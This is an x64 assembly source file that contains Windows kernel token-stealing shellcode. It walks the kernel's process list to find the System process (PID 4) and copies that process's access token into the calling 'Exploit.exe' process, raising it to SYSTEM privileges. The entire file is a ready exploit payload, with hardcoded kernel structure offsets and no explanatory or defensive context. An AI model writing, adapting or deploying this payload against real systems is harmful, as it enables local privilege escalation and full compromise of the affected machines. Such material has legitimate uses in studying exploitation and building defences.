PUBLIC Shellcode
.code

Shellcode PROC
	; Save state
	push rax ; Current process
	push rbx ; Current process pid
	push rcx ; Exploit.exe process
	push rdx ; System process token

	; PsGetCurrentProcess - get EPROCESS of Exploit.exe
	mov rax, qword ptr gs:[188h]
	mov rax, qword ptr [rax+70h]
	mov rcx, rax

	; Loop to find the System process
	L:
		; Get the next process in the doubly-linked list
		mov rax, [rax+188h]
		sub rax, 0188h

		; Get current process ID (stored at +0x180)
		mov rbx, [rax+180h]

		; The System process always has a PID of 4
		cmp rbx, 4
		jne L

	; Get the token address of the System process
	mov rdx, [rax+208h]
	and rdx, 0FFFFFFFFFFFFFFF0h

	; Store this token as the token of the Exploit.exe process
	mov [rcx+208h], rdx

	; Restore state
	pop rdx
	pop rcx
	pop rbx
	pop rax

	ret
Shellcode ENDP

END